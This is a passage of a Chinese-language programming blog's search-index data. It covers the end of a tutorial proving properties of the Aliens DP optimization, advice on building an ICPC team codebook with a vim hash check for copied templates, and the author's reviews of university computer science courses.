X}(f(x) + px)$ 就是拿著斜率是 $-p$ 的直線去緊貼著 $f$ 的時候，剛好貼在那條直線上的那些位置。因為 $f$ 是下凸函數，所以剛好貼住的位置是一個區間，隨著 $p$ 變大，這個區間會跟著往左移動，且 $p$ 變大時這個區間和之前的區間最多只會有端點部份重合。以下是較嚴謹的證明。\n引理 2：若 $k \\in \\textrm{argmin} _ {x\\in X}(f(x) + px)$ 則 $g(p + 1) - g(p) \\leq k \\leq g(p) - g(p - 1)$。\n證明：首先 $g(p) = f(k) + pk$。 由 $g(p + 1)$ 以及 $g(p - 1)$ 的最小性，我們有\n$$\n\\begin{cases}\ng(p + 1) = \\min _ {x\\in X}(f(x) + (p + 1) x) \\leq f(k) + (p + 1) k = g(p) + k \\\\\ng(p - 1) = \\min _ {x\\in X}(f(x) + (p - 1) x) \\leq f(k) + (p - 1) k = g(p) - k\n\\end{cases}\n$$\n移項得證。\n接著來證明，若 $p$ 是整數，左邊的等號可以成立。不妨假設 $x_p^*$ 是 $\\textrm{argmin} _ {x\\in X}(f(x) + px)$ 中最小的元素。由引理 2 我們已經知道 $g(p + 1) - g(p) \\leq x_p^*$。\n對於所有 $\\hat{x} \u0026lt; x_p^*$，由 $x_p^*$ 的最小性我們有 $f(\\hat{x}) + p\\hat{x} \u0026gt; f(x_p^*) + px_p^*$。特別地，若選定 $\\hat{x} = x_p^* - 1$ 可以得到 $\\nabla f(x_p^*) \u0026lt; -p$。移項得到 $-\\nabla f(x_p^*) \u0026gt; p$。由於 $f$ 的值域和 $p$ 都是整數，這可以改寫為 $-\\nabla f(x_p^*) \\geq p + 1$。\n由引理 1 有 $p \\in [-\\Delta f(x_p^*), -\\nabla f(x_p^*)]$，所以實際上 $p + 1$ 也在這個區間當中，由引理 0 可以知道 $x_p^* \\in \\textrm{argmin} _ {x\\in X}(f(x) + (p + 1)x)$。然而由引理 2，我們又可以得到 $x_p^* \\leq g(p + 1) - g(p)$。所以實際上 $x_p^* = g(p + 1) - g(p)$，最小的元素確實就是 $g(p + 1) - g(p)$。右邊的等號證明類似。\n整數段呈線性 和前一段的直覺一樣，拿著斜率是 $-p$ 的直線去盡量緊貼 $f$，而因為 $f$ 取值皆為整數，我們可以知道只有在 $p$ 也是整數的時候才會貼到 $f$ 的一段線段上；若 $p$ 不是整數，則緊貼在 $f$ 上的結果會是恰好只有一個點可以緊貼在直線上。這時，若 $p$ 稍微改變一點點，那麼除非 $p$ 變成整數了，否則緊貼到的點並不會變化，因此 $g(p)$ 的增加也是線性的。\n令 $x_p^* \\in \\textrm{argmin}_{x\\in X}(f(x) + px)$。\n由引理 1 得知 $-\\Delta f(x_p^*) \\leq p \\leq -\\nabla f(x_p^*)$。\n由於 $f$ 的值域是整數，$-\\Delta f(x_p^*)$ 和 $-\\nabla f(x_p^*)$ 也都是整數。若 $p$ 不是整數，則可以進一步得到\n$$\n-\\Delta f(x_p^*) \\leq \\lfloor p \\rfloor \u0026lt; p \u0026lt; \\lceil p \\rceil \\leq -\\nabla f(x_p^*)\n$$\n再應用引理 0，可以得知\n$$\n\\begin{cases}\nx_p^* \u0026amp; \\in \\textrm{argmin} _ {x\\in X}(f(x) + \\lfloor p \\rfloor x) \\\\\nx_p^* \u0026amp; \\in \\textrm{argmin} _ {x\\in X}(f(x) + \\lceil p \\rceil x) \\\\\n\\end{cases}\n$$\n必然地\n$$\n\\begin{cases}\ng(\\lfloor p \\rfloor) \u0026amp;= f(x_p^*) + \\lfloor p \\rfloor x_p^* \\\\\ng(p) \u0026amp;= f(x_p^*) + p x_p^* \\\\\ng(\\lceil p \\rceil) \u0026amp;= f(x_p^*) + \\lceil p \\rceil x_p^* \\\\\n\\end{cases}\n$$\n故線性性質得證。\n順便可以證明，若 $p$ 不是整數，則 $|\\textrm{argmin} _ {x\\in X}(f(x) + px)| = 1$。\n由於 $\\textrm{argmin} _ {x\\in X}(f(x) + px)$ 是一段區間，若沒有退化成一個點的話，一定可以找到 $x_p^*$ 使得 $x_p^*$ 和 $x_p^*+1$ 都取到最小值，即\n$$\ng(p) = f(x_p^*) + px_p^* = f(x_p^* + 1) + p \\cdot (x_p^* + 1)\n$$\n然而這代表 $f(x_p^*+1)-f(x_p^*) = p \\not\\in \\mathbb{Z}$，與 $f$ 的值域是整數矛盾。所以最小值的位置是唯一的。\nComparison \u0026amp; Examples 方法 優點 缺點 還原 penalty 次數 容易理解，且只需要 $\\log_2 C$ 次求解 $g(p)$ 需要多維護次數且需要小心 tie-breaking 對差分二分搜 比三分搜快，也很好寫 需要 $2\\log_2 C$ 次的求解 $g(p)$ 三分搜 浮點數的情況是一個折衷好選擇 需要約 $3.41 \\log_2 C$ 次的求解 $g(p)$ 黃金比例搜 後三者中最快的，僅需約 $1.44 \\log_2 C$ 次求解 $g(p)$ 實做較複雜，若要當場實做較困難 TIOJ 1986 | 郵局設置問題 $\\infty$ EXTREME hint: 這題除了 Aliens 還需要另外一個優化，而且時間其實頗緊所以不一定能用本文的方法 CF 739E | Gosha is hunting hint: 這題的值域不是整數而是浮點數，因此有些小性質會不一樣，且不能用對差分二分搜。 TIOJ 1727 | 限制特定點度數的最小生成樹 洛谷 P2619 | k-白邊最小生成樹 hint: 這題實際上是前一題的 generalization References https://noshi91.hatenablog.com/entry/2023/11/20/052227 https://noshi91.github.io/algorithm-encyclopedia/d-edge-shortest-path-monge https://en.wikipedia.org/wiki/Fenchel%E2%80%93Moreau_theorem https://zh.wikipedia.org/zh-tw/%E5%B7%AE%E5%88%86 https://twifor.github.io/2021/01/16/%E6%B5%85%E8%B0%88wqs%E4%BA%8C%E5%88%86/ https://taodaling.github.io/blog/2020/07/31/WQS%E4%BA%8C%E5%88%86/ https://www.doc88.com/p-949564862405.html 加註 本來這篇文章想說會短短的，但想說要好好證明一些事情結果就不小心放太多又臭又長的證明了，捨不得刪掉。而且因為懶惰所以引入好多符號，然後正負號選擇也讓有些定理的敘述變得非常不優美，可惜了。\n儘管如此這邊的證明還是看起來東缺西漏的，總覺得應該有更簡潔的一勞永逸的方法才對。\n若有錯誤歡迎指出。\n","permalink":"https://omeletwithoutegg.github.io/2024/10/05/aliens-dp/","tags":["dp","dp-optimization","tutorial"],"title":"Aliens DP 備忘錄"},{"contents":"How to make team reference document in ICPC 前言 在 ICPC 競賽中一個不可或缺的元素就是在 規則 裡面被稱為 Team Reference Document 的東西。台大這邊俗稱叫 codebook。\n在上一次的 WF 當中是規定每一隊可以帶至多 25 頁的紙本參考資料，必須是單面印刷，字體大小需要「0.5 公尺的距離下正常視力的人可以直接閱讀」，並且可以帶總共三份完全相同的拷貝。\ncodebook 是 ICPC 比賽與高中競賽相當不同的一點，平時就開始準備 codebook 可以讓你對這些模板更加熟悉，節省三人一機規則下寶貴的上機時間。\n要放什麼？ 環境設定\n我們隊上使用 vim，因此理所當然的會有一份 vimrc。\n在 vimrc 中最佔篇幅的是我們設定的編譯快捷鍵 mapping，我們設定了三個快捷鍵： F8 是加了 sanitizer 跟 warning 的編譯，平常正常寫題時就按這個編譯。我們盡量把幾乎所有 warning 跟 sanitizer 都開起來，這樣比較容易在還沒上傳前就找到錯誤，也養成寫程式碼的好習慣。 F9 是加了 O2 flag 的編譯。sanitizer 會讓程式跑得慢很多，有許多情況會需要在本機測速度，例如「跑跑看這個爆搜多快，會過乾脆就這樣傳」、「worst case 跑多久」或是「這題 TL 有點緊繃，用一下 time 看隨機大測資怎麼樣」。 F10 是執行。我們隊的習慣是會把每題的執行檔都編譯成不同的檔案，例如 a.cpp 會編譯成 a，c2.cpp 會編譯成 c2。如果沒 precompile 的話，通常編譯的速度不算快，在 ICPC 當中有不少時間會同時開兩題以上，因此會想要能夠快速的想要切換到另外一題測試。\n如果你平常有使用一些簡單的 default code / macro 而且可以塞進 codebook 的話可以就放進來，平時寫題的環境和比賽能夠盡量一致是最好的。 有一定頻率考，但比較難當場寫出來的東西\n例如 Dinic / HopcroftKarp 系列、半平面交、Suffix Array 等等。\n有些 regional 當中也會考察 formal power series 的模板，雖然據說 world finals 不會考模 998244353 的題目，我們還是不敢拿掉。 一些細節容易搞錯的東西\n例如：找歐拉迴路、二維凸包、KMP、字串 rolling hash、1D/1D DP 優化等等。\n一些敘述簡短的數學公式也會放上去，例如常考的線性規劃對偶、球座標公式，或是之前我們團練時推了超級久都推不出來的微分公式。這些數學公式可能基本上可以在比賽中自己推出來或背出來，但放在 codebook 上除了也許能加快速度就是不怕一萬只怕萬一推錯。\n「如果有 codebook 可以抄，你沒有理由不抄 codebook」 一些莫名其妙的邪教\n這些東西考的機率都非常低，但我們之前在省 codebook 空間的時候實在太省了，於是比起線段樹那些我們隊伍平常自己就可以寫出來的東西就留下了這些。\n舉例來說有一般圖最大權匹配（護國神題？）、HLPP、擬陣交、min 25 篩。\n這些東西在一個正常的比賽通常不會是考點，可能就是擺在那邊當吉祥物，或是偶爾想吃毒直接砸下去就過了。 Hash 抄模板的時候，最怕的就是抄錯，更怕的是不知道是在其他地方錯了還是模板抄錯，或是模板本來就是錯的。\n在 codebook 裡面加入 hash 的 idea 是從 KACTL 學來的。\n比賽環境的 Ubuntu 通常會有各種標準的 hash 的指令，於是我們就可以用比如說 md5 的方式，在抄完一段程式碼之後可以快速比對我們抄的那段是否和 codebook 上寫的相同。\n在 vimrc 內加入這段指令\n1 ca Hash w !cpp -dD -P -fpreprocessed \\| tr -d \u0026#34;[:space:]\u0026#34; \\| md5sum \\| cut -c-6 就可以先用 visual mode 把抄的那一段選起來之後，用 :Hash 來得到那一段的 hash。計算 hash digest 值時會無視註釋以及空白和空行，因此在抄模板時可以不抄註釋或是選擇在不同地方斷行，非常便利。\n然而這個機制並沒有找到是哪裡抄錯的功能。在我們目前的幾個模板上，我加上了分段 hash 的功能，如果抄錯能夠至少分辨是哪一段抄錯。\n養成一抄完就檢查 Hash 的好習慣才不會浪費一些莫名奇妙的時間\u0026hellip;\nAS-IS : 完全照抄 既然是模板，你應該要能夠把模板部份閉著眼睛貼上就能通過模板題。\n平常在抄模板的時候，應該盡量就不帶腦袋當成 typeracer 盲打式的抄寫，不要準備一個模板是我某些地方還要因應不同場合改成不同寫法的，很容易不小心哪裡沒改錯就出 bug，而且如果不完全照抄的話，上面提到的 hash 機制也幾乎等於沒用。\n如果是有一些常數或是步驟需要依情況更改的話，可以像是用 template 參數 / 函式引數或是傳一個 function 進去的方式。\n一般化 template 比直接寫死一個型別好，vector 比使用陣列好。\n現在的 C++ 有 auto 這種型別的簡短寫法（以前都需要用 template），會自動在編譯時期做 polymorphism，舉例來說，像是字串比對的 KMP 函數當中，雖然常常都是傳 std::string，但有時也會想要對 std::vector 做 KMP，這時把函數的參數改成 auto 就非常方便。\n使用 vector 來說，除了原本的 vector 複製一遍非常簡單以外，複製也是函式參數的預設行為。這種比較 pure 的寫法會讓程式比較不容易出錯。\n關於在不同型別的「無限大」這個值要開多大，可以使用 numeric_limits\u0026lt;T\u0026gt;::max() / 2 之類的寫法，如此一來就不用取捨要用效率可能比較快的 int 還是比較不會溢位的 long long 當成模板的預設型別了。\n效率 因為模板抄下去之後我們通常不會想再改動，因此在準備時也需要考量要用執行的速度有效率的寫法。\n例如說在兩維以上的陣列的情形，直接用 vector\u0026lt;vector\u0026lt;\u0026gt;\u0026gt; 的效率會有明顯的下降，這時如果我們對陣列只是一些比較單純的用法的話，可以簡單的用 native array 的方法開。\n或者，在各種地方多加 const reference，除了可以在使用模板時確認你不會更動這個容器以外，理論上也會讓編譯器更容易做最佳化。\n註釋 通常來說，註釋最重要的會是這個模板的使用方法，例如像是「李超線段樹預設是取 min 還是取 max」或是「floor sum 的複雜度是多少」之類的。\n如果你的模板不能處理一些邊界情況，最好當然就是改成可以處理的寫法，再不然可以 assert 邊界情況，最慘就是寫在註釋，等到踩到坑或是某個隊員有記得才會發現。\n程式碼風格一致 : 可抄性 在抄寫程式碼的時候，有些我們的 hash 指令無法當成相同但其實相同的細節，例如 i++ 與 ++i 或是只有單行的 statement 要不要加大括號。至少在一份模板的裡面風格能夠統一的話，會更易於抄寫。\n隔離 演算法內部的細節通常不是我們在使用模板時關心的事情，例如我們通常在解完雙連通分量之後就不會再用到 low 值陣列了。在 ckiseki 隊上常用的是用 struct 或 class 等把演算法的內部細節藏住，對外主要 expose 幾個函式就好。當然如果整個模板就是一個函式的話，通常也擁有更高的獨立性，例如我們現在的最小有向生成樹的模板，就是只傳邊陣列進去回傳選哪些邊的一個函式。\n用 struct 還有一個優點就是可以使用 constructor，指定在初始化的時候一定要做的步驟。前人流傳下來的有些模板會需要呼叫 init 之類的函式，常常忘了呼叫就會 debug 很久，是個浪費時間的坑。\n善加利用空間 為了想要放更多東西進來我們的 codebook，我花了一些心力調整行距或空白之類的，並且把許多 .cpp 檔利用 C++20 有的各種語法糖節省空間，也把原本非常空卻佔了一整頁的目錄調整為只有半頁。放更多東西進來雖然讓我更安心，但也發現其實 codebook 準備得再好，也很難提高 ICPC 表現的上限XD，主要是能表現得更穩定。\n平時的測試 最重要的是平時 virtual / 參加比賽就要多用模板，這樣你才會更知道你的模板有哪些禁忌事項，或是模板的效率怎麼樣、哪裡很難抄之類的。\nlibrary checker 是一個有用的網站，你可以從這邊看到一些會想 library 化的問題，以及可以上傳測試模板（雖然似乎正確服用方法是自己 clone 下來本地跑）。\n目前 ckiseki 的 codebook repo 沒有 CI/CD 在 GH action 之類的跑這些自動測試，不過我們有維護一份 markdown + yaml 文件，除了寫每個模板有在哪裡測試過以外，也有稍微寫一下模板的注意事項、效率等等。\n本文所講的許多重點都是實際上無法完美兼顧的，例如有時候會想要犧牲一些空間來放註釋，或是有時候想要讓程式碼直接獨立能夠使用而犧牲了一些一般化的能力。平時不管是比賽還是刷題，多使用多測試隊上的模板，才能找到適合的平衡點。\n簡單的例子 https://github.com/kth-competitive-programming/kactl https://github.com/brianbbsu/8BQube https://omeletwithoutegg.github.io/ckiseki/ https://github.com/ToxicPie/NaOCl 以下幾項不是 25 頁的。\nhttps://tatyam-prime.github.io/ICPC_notebook/ https://maspypy.github.io/library/ ","permalink":"https://omeletwithoutegg.github.io/2024/07/13/icpc-codebook/","tags":["icpc","codebook","template"],"title":"ICPC 競賽中如何製作 codebook"},{"contents":"Sixth semester 在大約一月底我們得知 ICPC 會在四月舉辦。於是這學期我還是盡量把課排少，學期初的時候我原本選了一個國文課，但後來退掉了，學分也剩下 14 學分需要低修單。剩下只有五門課看起來真的超級少的。\n密碼學導論 學期初的時候去聽了一下覺得可以修，而且資工系一堆人都搶著要修的樣子。三類加簽，所以只要在網路上加選等抽中，雖然是個兩百多人的課但抽中也不難，會有不少人退選。\n學期初會先講一些簡單的抽象代數，基本上都是會討論像是 $Z_n$ 或是 $GF_{q^n}$ 這種有好性質的 ring/field，主要是為了 AES 鋪路。\n後半學期會講 RSA 以及一些旁通道攻擊的例子，然後還有 ECB/CBC 等加密模式或是像是金鑰分發、certificate authority、bitcoin、區塊鏈這種比較分散的對我來說感覺沒什麼動力學的東西。最後雖然確實有講後量子密碼學，但其實也就是維基百科上查得到的東西而已，沒有得到什麼太有用的知識的感覺。\n每個禮拜都有一個小考，雖然只算最高六次但我到學期末都沒湊滿，大概差一兩分。大概到差不多期中考的時候一開始幾個一起來修的資工系同學停修掉了，雖然我沒有停修但後來的小考和上課有點後悔，一直考一些奇怪的細節或是背誦的東西，然後好幾次的問答題我寫了一大篇作文沒拿滿分真的哭。\n期中考我有點考爆，拿了個 82 分。期末考考了 91 分，我那時候心想完蛋了這樣考試平均也不到 90 怎麼 A+，但還是太小看作業的分數了。\n整學期只有一個作業，大部份都是課本上的題目，加上一些看影片寫心得跟用 sage 做一些超簡單的練習。\n課本的題目感覺其實也沒什麼品味，而且有一些題目感覺像是有問題。\n作業有一個提早交加分的機制，從大概 16 題裡面選最好的 12 題。我那時候就卷這份作業，想要把全部的題目都在提早交的期限前寫完，雖然最後一些看影片寫心得的部份沒有寫但還是花了蠻多力氣，最後這邊的分數有拿滿；其實我懷疑我又抄題目又用 $\\LaTeX$ 又每題都寫，如果我是助教肯定是心想「這麼長誰想改乾脆直接給滿分好了」(X。\n人工智慧導論 忘記是上一屆還是這一屆開始是系上必修。\n前半學期講了什麼是人工智慧跟一些比較古早的方法，主要是像是 A* 或是 alpha-beta 剪枝等 exhaustive search 以及一些機率的 bayesian inference 之類的東西。\n後半學期則是開始談機器學習，講 supervised 和 unsupervised 的一些方法，最後比 HTML（林軒田教授開的 ML）多的東西可能就是 reinforcement learning 吧。\n不過我都沒有去上課，唯一一次去 103 教室是期中考的時候。期中考有夠擠，座位連梅花座都做不到，整排都是人。\n期中考抱佛腳抱不夠足，而且很好笑的是我到考完才知道原來可以帶大抄進去。考了個差不多是平均的八十幾分。\n作業總共有四次的手寫+程式加上一個 final project。\n手寫的部份 hw1 和 hw2 都是照定義模擬或計算一些東西，hw3 和 hw4 則是有計算和證明，但幾乎都是 HTML 的子集。\n程式作業的部份，hw1 跟 hw2 是從 Berkeley 端來的作業，要用寫一個 pacman 遊戲的人工智慧。hw1 是寫 A*，hw2 則是 alpha-beta 剪枝，並且需要額外自己設計一個夠好的 evaluating function（heuristic 好難）。\nhw3 是各種經典的 regression 跟 classifier，hw4 則是簡單的 PCA 跟用 pytorch 寫一個 autoencoder，都是蠻標準的 task。\n從 hw4 開始用 Github Copilot，覺得好好用，要被取代了QQ\nfinal project 跟往年一樣是德州撲克的單挑。\n公開的 baseline 有七個，會跟每個 baseline 打 BO5，每次是 20 個 round。額外還有 private 的 baseline，以及和其他學生寫的 agent 比賽的加分項目。\n我一開始嘗試使用一些強化學習的方法，但真的完全 train 不起來，波動太大了，baseline 又跑很慢。\n然後只好開始各種查資料，各種手寫 if-else 或 evaluating function 的工人智慧，又各種調參。\n感覺已經花太多時間在上面了（大概兩個禮拜都純泡在上面），但後面的 baseline 真的很難達到六成以上的勝率，最後 final project 的分數還是得放下，看上帝擲骰子。我最後的成績是公開的 baseline 拿到 33/35，祕密 baseline 6/10，和同學對戰 6+0/10+4，以及 report 54/55。\n最後發現雖然期中考考成那樣，但作業分數其實我都有拿到，可能其實也不需要那麼卷也能拿 A+。反正有盡力作到最好了。\n計算機網路實驗 算是必修之一，計網實或計系實需要選一個修，前一個學期聽別人修計系實很累，所以這學期被問說要不要計網實組隊之後就答應了。\n原本對計網實的印象可能跟網服搞混了，以為是一個做網頁的課。\n這門課是老師講一點點課，然後主要是做三次的實驗以及做一個 final project。\n三次實驗的主題分別是：防火牆+DHCP+NAT、Wireless AP 認證機制、IPv6 mobility。\n不得不說，這些實驗真的非常老舊。現在都已經是 2024 年了卻還在用什麼 Ubuntu 16.04 或 14.04 之類的。\n然後上課投影片看似會給你詳細步驟，但有時候你會遇到一些奇怪的問題，如果不是你漏了或是做錯什麼步驟，搞不好你把投影片往後翻幾頁就會看到一個 section 專門在講這些坑。當然我們自己也常常給自己一些奇怪的坑，例如 AP 插錯孔，windows 防火牆沒關，DHCP 動靜態 IP 設錯等等。再加上實驗幾乎都叫我們在 virtualbox 裡面做，各種用虛擬機會踩的坑也再踩一次。\n實驗目標檢查的點或是 troubleshooting 的一些奇怪坑點也在在顯示這門課的實驗非常老舊。\n例如實驗目標說要讓使用者有一個 wifi 使用時間上限，要檢查是不是會定時把人給踢出還有做倒數計時，我們在前端 JS 隨便放一個每次登入開始倒數計時十秒也算成功（照理說應該也要和後端查一下吧？）\nFinal project 基本上就是做一個月內做得出來的東西。雖然說「請同學結合本學期Lab 1、Lab 2、Lab 3 所學的技術開展期末專題。」，但我們在 proposal 的時候老師一開始理解成另一個方案，然後說這樣比較創新就這樣做。雖然我沒有覺得創新，但反正老師開心重要，我們最後也沒有跟前幾次 lab 有太大的關係，就基本上是我們分工寫一個有前後端的網頁架在 casper 家的機器上，最後是成功拿到 A+。\n數學之美 以前沒有修過，雖然數美學分已經只能算通識了，但聽說這學期是老師最後一次開，也想說這學期該選點輕鬆的課。\n感覺呂學一老師上這堂課的時候很開心，跟大家分享這些數學小知識的語氣都蠻高興的，還會到處走來走去點附近的同學回答問題（很簡單的問題或是開放式問題為接下來的東西鋪墊）。\n上課主要的內容就是一些有趣的數學知識跟悖論，例如集合的 cardinality 或是實數是如何建構的，然後 hydra game 跟羅素悖論等等。\n我第一次學到這些東西的時間應該是在高三修數學系微積分的時候吧？cardinality 記得是那時候助教課在黑板上講的，ZFC 則是某次跟 AY 吃拉麵的時候聽他有講一點。\n跟往常的呂學一老師一樣會有一些你不上課/看投影片不會知道的老師自己發明的名字，例如死神悖論，咖啡牛奶問題或是海怪定理（指 hydra game 一定會結束）。\n這次其中一個助教是 HWH，似乎在 Dcard 上評價不錯。\n關於算分，沒有作業，有三次考試，每次會是十二題中挑最高的 X 題算分，X 會依照你的系所有沒有必修微積分調整，應該最高是十題。\n有些證明是他會問你上課講的證明方法的細節，所以 either 是上課要稍微聽一下或是看投影片有沒有。\n然後也有一些奇怪的背誦，例如問你 RSA 是哪三個名字的縮寫（Rivest, Shamir, Adleman），或是希爾伯特的二十三個問題的細節。\n還會有一些選擇題例如像是「使圖論中 k-colorable 是 NP 困難的 k，目前已知最低是多少」或是「請問連續統假設在 ZFC 的前提下是一定正確/一定錯誤/都可以/未知」之類的問題。\n考試的時候我幾乎都寫到最後，幾次都覺得自己寫得不夠嚴謹，但要再寫更嚴謹就得花更多時間或是紙不夠（把十二題分配在四頁的答案紙好難），所以有時候就只能留下一些自己覺得不太嚴謹的說明。\n上課時用的數學其實也偶爾會有我覺得奇怪的地方，例如他解釋所謂死神悖論時定義了所謂 \u0026ldquo;recurrence\u0026rdquo; 函數 $c : [0, 1] \\to \\{0, 1\\}$\n$$\n\\begin{cases}\nD \u0026amp;=\n\\{ \\frac{1}{2^n} : n \\in \\mathbb{Z}^+ \\}\n\\\\\nc(x) \u0026amp;=\n\\begin{cases}\n1 \u0026amp; \\text{if } x = 0 \\\\\n0 \u0026amp; \\text{if } x \\in D \\land b(x) = 1 \\\\\nb(x) \u0026amp; \\text{otherwise}\n\\end{cases}\n\\\\\nb(x) \u0026amp;=\n\\min \\limits _ {y \\in [0, x)} (c(x))\n\\end{cases}\n$$\n但這裡我覺得因為實數正常的大小關係不是 well-founded，講 recurrence 感覺有點奇怪。此外 $b$ 的 domain 不能包含 0，否則是對一個空集合取 min；然後 $b(x)$ 取 min 的範圍是一個半開區間，並不一定取得到最小值，是因為 $c(x)$ 的值域是離散的才有保證。\n總之這門課可以學到一些沒什麼用但很有趣的數學小知識，如果是個常常在 youtube 上看這種東西的人可能會喜歡這門課。不知道之後會不會再開。\n圖形演算法特論 kmchao 開的課，主要是在教一些圖論的性質跟演算法。特別會聚焦在樹上，並且主題基本上都是從他以前寫過的一些東西來的。\n學期初一講完一些樹的基本性質還有最小生成樹、最短路徑樹之後，就開始講幾個 NP 困難的問題的 approximation。\n這堂課是英文授課，並且老師的步調很慢，我期中考和期末考的知識主要都是讀他網站上給的 PDF 來的，再加上厚臉皮跟一些人問。分別都考了九字頭，吃競賽程式的老本。\n這門課沒有作業，但是有分組的期末報告，需要選一篇論文做一個大約一小時的分享，論文主題應該主要是限制在圖論。\n我們這組依成員看可能算競賽組，選到的論文是在證明某個遊戲的納許均衡的圖一定是一棵樹。果然我還是不太會啃論文，原本感覺應該大家先各自讀完，但是經過大家長導讀之後突然就到分工作環節，然後我也只有特別讀前情提要跟我被分到的部份（介紹一些 lemma）。\n因為是英文授課，也有國外的學生，所以我們需要用英文報告，我還蠻緊張的，不過最後我覺得我們報得還可以，也許只是當天報告的另外幾組都讓我們感覺不出來他們在幹嘛。當然我猜可能我們也沒讓他們聽懂我們報告的這篇論文在幹嘛，畢竟要一小時內理解一篇論文也蠻難的。\n結語 最後這個學期竟然同時是比 ICPC 跟 4.3 的學期。WF 佔用了大概一兩個禮拜的時間，然後我又一直拖延，WF 回來後各種工作和作業都一直在 queue 裡面彷彿處理不完，考試也沒讀精，從學期初開始就默默在我也一直沒做事的 NASA 簡直就是在說我能力不足的主旋律。\n放暑假後以為自己要寄了的密碼導和 AI 導意外 A+，也要感謝各種組員，這學期有好多分組期末報告的課。\n只有 14 學分似乎在排名上會輸，不過魚與熊掌不可兼得，就別想太多了。\n","permalink":"https://omeletwithoutegg.github.io/2024/07/07/csie-6th-sem/","tags":["CSIE","experience"],"title":"第六學期修課心得"},{"contents":"Fifth semester 這個學期（大三上）原本預期是要在十一月參加 ICPC World Finals 的，所以選課除了必修以外都是選自己想選的，盡量只選到不用填低修單的學分。\n很貪心的還想要 4.3，但最後大失敗。\n室內五人制足球初級 跟 ZCK 一起來修的我的第三門體育課。\n跟之前（室外）足球的老師是同一個老師，課程也大同小異，只是從室外十一人制變成室內五人制，球也換成室內五人制一般會使用的低彈力球。\n不過畢竟是在室內，所以不太會在室外踩泥土曬太陽，而是踩體育館的地板有屋頂，也許比較舒服。\n看到許多之前在室外足球課的熟面孔，好課一修再修。\n這次一樣有分組比賽，分組後我們這組看起來似乎是四組裡面最菜的XD 之前的熟面孔強者都在別組。\n不過除了跟最強的那一隊比賽以外其實都打得還可以？\n我們這隊有幾個印尼人，他們感覺比較會踢，有大局觀的感覺，帶著我們也算是可以跟一些隊打平。\n除了比賽部份會加分以外，術科項目的考試有兩個，一個是兩人互相傳球，一個是帶球繞一圈。\n帶球繞一圈就吃小學的老本，感覺帶得還不錯（可能整堂課都有吃老本的部份，小學有在踢足球）。\n另外這次有 ZCK 當隊友，兩人互相傳球的部份配合得比較好，總之最後拿到了 A+。\n數值線性代數 來修一門感覺很數學的課。\n這門課一開始先介紹高斯消去法，然後講 condition number，也就是什麼樣的線性系統是病態的，只要一開始出了一點誤差就會被放大數倍。\n前半學期講了 matrix norm 以及 SVD 等（整個學期都不會講 SVD 實際上怎麼有效率計算 :P）。\n後半學期介紹 iteration method，重心會放在 conjugate gradient method。\n一些簡單的矩陣分解（LU, LDU, QR, cholesky 等）也會講到，但感覺都 focus 在手算的方法（畢竟真的實用的方法是都頗複雜），再稍微給我們一些 QR 的數值穩定度比較好、LU 比較快之類的概念。\n這門課使用的教材是 ALAFF，會要求我們預習看影片等等。\n另外每堂課後幾乎都有實驗課，是助教用 google colab 讓我們用 numpy 跟 scipy 的套件寫一些有關矩陣運算的東西。感覺我應該還算熟這些套件所以很輕鬆。\n最後還有一個算分的作業是每個人要上台分享一次一個 topic 的環節，但我沒有上去分享，再加上蹺了數次課，有幾次實驗課沒作到。\n考試期中考了 89 期末考了 92，但 lab 分數只有 75、作業分數只有 78，拿了一個難看的 B+。\n不過我覺得這門課算是有趣，而且在 virtual 某場 WF 的時候彷彿有幫上忙。\n計算機網路 系上必修。\n其實我只有學期初上過幾次課。\n期中考前的大部份知識都是修 NASA 時就知道，或是從其他管道（例如 CTF 或者高中專題）本來就知道的知識。\n期末考會把 TCP 以及一些 protocol 考得更細。兩次段考都有很多定義、公式，雖然會做簡單的計算但還是背誦蠻多的，需要多看投影片。\n比較有趣也比較困難的是程式作業的部份，作業二跟作業三分別要求我們用 C/C++ socket programming （不能用框架例如 drogon） 自己寫一個 http server 跟 congestion control。\n對我來說算是個大工程，例如作業二我的 server 和 client 加起來總共有快一千行，但寫出一個還算滿意的東西有點美。\n期中 98/100 期末 97/120，總之最後拿了 A+，考期末離開的時候大助教還來 survey 一下這門課上得怎麼樣但我甚至蹺課成癮好心虛。\n不過從少數幾次上課經驗來看，老師和大助教都很不錯，助教品質優良（？）而且作業是用 github classroom 提交不得不給好評。\n計算機結構 系上必修。\n對我來說是一個跟 SP/OS 一樣煩躁的課。\n老師會要求我們每週先看影片預習，然後上課就快速講過投影片，並且抽人來回答問題，有一些點名機制的感覺。\n另外會把各班分成大概六個人的小組，在第三堂課會先讓我們小組討論一份題目後在 NTU COOL 上抽兩題以選擇題的方式考，題目可能會改一些細節例如改數字之類的。\n小考題目各組一學期需要出題一次，這個小考感覺不太嚴謹，常常會有題目怪怪的問題，然後雖然是關書不討論的方式考但也是自由心證。\n有時候老師會遲到，大概快十點到之後又十點半開始小組討論，就常常有一種印象是老師沒講多久。\n作業一開始會是寫一些組語的程式，接著後面的 verilog 作業先是寫一個 CPU，最後用 verilog 寫出有 pipeline 加速的 CPU。有 pipeline 加速的 CPU 實在是一個有點大的作業，有一件事是我一開始想把不同的 pipeline stage 好好分成不同檔案，但 CPU 內部的東西耦合實在太嚴重難以分開，最後重新寫把大部份的 code 放在 CPU 的檔案裡面，當成用一大堆全域變數來寫。\n課程內容對我來說幾乎都是背誦內容，會學 RISCV（一個比較簡潔的 CPU 架構）的組合語言命令以及 CPU 內的幾個 component 怎麼運作的，會講 pipeline 這種加速方法以及做 pipeline 會遇到的問題，也會講一些 virtual memory / memory hierachy 的東西（SP/OS 不是講過了嗎？）\n考試會需要背誦很多細節，把自己當人腦 CPU 模擬一些東西，算一些小學加法，當然也要對組語非常熟悉。\n整堂課找不到什麼想學的動力，兩次考試都考差不多八十分，最後拿了 A。\n計算邏輯簡介 因為之前有去過 FLOLAC，所以想要來修一下這門課。\n課程一開始會講怎麼寫出一種特定格式、很工整的形式化證明（主要是有關邏輯，會談一階跟二階邏輯），有點像 FLOLAC 裡面講的 natural deduction deviation tree 但是是壓平版本。\n後面則是講把時間或是狀態（finite state machine）考慮進謂詞邏輯的一些 extension 例如 LTL。\n一邊教會一邊帶給我們一些特定的程式驗證工具或證明輔助工具，例如 SAT solver, promela（可以用來驗證 LTL）, 還有 Coq。\n上面有部份唬爛因為我都沒去上課 但總之寫作業是一個輕鬆的休閒活動（準備考試不是，前兩天看投影片瘋狂抱佛腳），最後有拿 A+。\n程式設計技巧 這個學期擔任助教，但也同時在 too_soft 打比賽。\n已經是修課第三個學期，不能再算進畢業學分，但沒去過其他國家的 regional 想去去看，oT 